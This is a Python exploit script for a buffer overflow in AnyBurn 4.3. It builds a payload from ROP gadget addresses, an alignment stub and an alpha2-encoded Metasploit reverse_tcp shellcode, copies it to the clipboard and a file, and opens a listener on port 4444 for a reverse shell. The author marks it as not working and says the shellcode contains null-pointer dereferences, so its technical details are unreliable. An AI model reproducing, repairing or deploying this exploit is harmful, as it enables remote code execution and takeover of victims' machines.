#!/usr/bin/env python
#
# _NOT WORKING_ AnyBurn 4.3 exploit based on:
# * pwntools
# * metasploit reverse_tcp payload
# * alpha2 encoder
# * ropper
# * ideas used in original one: https://www.exploit-db.com/exploits/46025

import pwn
import pyperclip
from threading import Thread


def generate_payload():
    # gadgets found using ropper --ppr
    # filtered to the ones with addresses that can be used as ~NOPs
    # 00460023 -> and eax, [eax] <- exception on NULL access :(
    # 004600c5 -> lds eax, [eax] <- exception on NULL access :(
    # 004D00b5 -> mov ch, 0x0; dec ebp; \x00 <- winner, doesn't break execution

    GADGET_ADDR = "\xb5\x4d"
    NOP = "\xEB"  # EB00 translates to JMP $+2, 00EB to ADD BL,CH
    ALIGNMENT = "\x65"  # 3-byte alignment

    # FIXME!
    # generated with alpha2 or msf...
    # all versions are somehow broken, i.e. they have NULL ptr deref embeded
    # leaving like this for now...
    shellcode = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBYI977KZM9OV1EY8YD4O4JTQMNKXI81PR01QMN7M31MLWTCO8IK3C1LPNLLZQEOVNHMEFLV0KKL66PMN8FOMVKUPLQLXL0K349GEPQ34K0PLNGB72S1MSE6UUYQON9KM5YKL0NNOTMLZLWSN4ZU2ZBQ3X3BNVOZMSXHXVGZ8PTYJ9KK0G4QSS9KC6T6FX0U40UKTENLLKBO2QFOYMUQ3JMLMPLN3Y1LREUYSBNK5OWYLONLQTVSHKX9CNMC5OLZQJ5UPLKLMY5YP94J2UVNGL1OLN7ZOE1NWPQJLMOUXDM7Z5JDQMK26XLYWMPM2D7LVVQP2QXMDUZLWFKLNEJMXPRWR6IOSONLZPPSL7ZJKW5CMR0JTWBJ8MVK7NW8TYKKUXLY72UGMXG5T7OGT8LINHJXMXYYDXTPNB9VHGCQPMNLQPNKWDUWPOM4WIQBOH27WU4MK4YNNCHGM4H7KL2P7L4RT6YPOQKYZSO2GY7NKTJLNZHJMF4YHJCQ14LL8TOOK0YBQ7W4L0UMSKBSVGXJOZDJNMYWJUMT23ZZQPLN8WMQ21V1YFETZMWE7XRPJMJQWLNLVXVOBJDKLRMNY4Q5WXI83PN0NBXK8VMLBOWMNV6LGVZX19KQTOLLNR3ONOL2YYOKQO6YVSRJXHQTO6NO65V65M2LW0MDN7LM0WKT0RKXLS52TOQPLLS7FOHWNM5RA"

    filler = ""
    filler += NOP * 87
    filler += ALIGNMENT
    filler += shellcode
    filler += NOP * (9197 - len(filler))

    payload = filler + (NOP * 2) + GADGET_ADDR

    setup = ""
    setup += ALIGNMENT
    setup += pwn.asm("push ebp")  # to calculate ofset to shellcode
    setup += ALIGNMENT  # another 3-byte, as previous op was 1 byte
    setup += pwn.asm("pop eax")  # use eax as mov eax is most convenient later
    setup += ALIGNMENT
    setup += "\x05\x01\x41"  # add eax, 0x41003B00
    setup += ALIGNMENT
    setup += "\x2D\x3B\x41"  # sub eax, 0x41000100
    setup += ALIGNMENT
    setup += pwn.asm("push eax")
    setup += ALIGNMENT
    setup += pwn.asm("ret")

    return payload + setup


def attack():
    payload = generate_payload()
    pyperclip.copy(payload)  # kindly copy to clipboard

    f = open("PAYLOAD.txt", "w")
    f.write(payload)
    f.close()


if __name__ == "__main__":
    # set target info
    RHOST = '192.168.15.100'
    RPORT = 80
    LPORT = 4444

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
